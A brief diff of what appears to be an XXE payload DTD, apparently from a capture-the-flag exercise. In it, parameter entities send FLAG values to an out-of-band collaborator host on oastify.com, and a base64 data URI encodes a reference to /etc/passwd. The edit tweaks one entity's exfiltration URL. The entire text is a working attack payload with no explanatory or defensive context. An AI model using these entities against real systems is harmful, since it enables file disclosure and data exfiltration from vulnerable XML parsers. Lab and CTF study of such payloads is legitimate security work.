@@ -1,6 +1,6 @@
 <!ENTITY % test1 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG1;">
 <!ENTITY % b SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
-<!ENTITY % test2 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%FLAG2;">
+<!ENTITY % test2 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG2;">
 
 %test1;
 
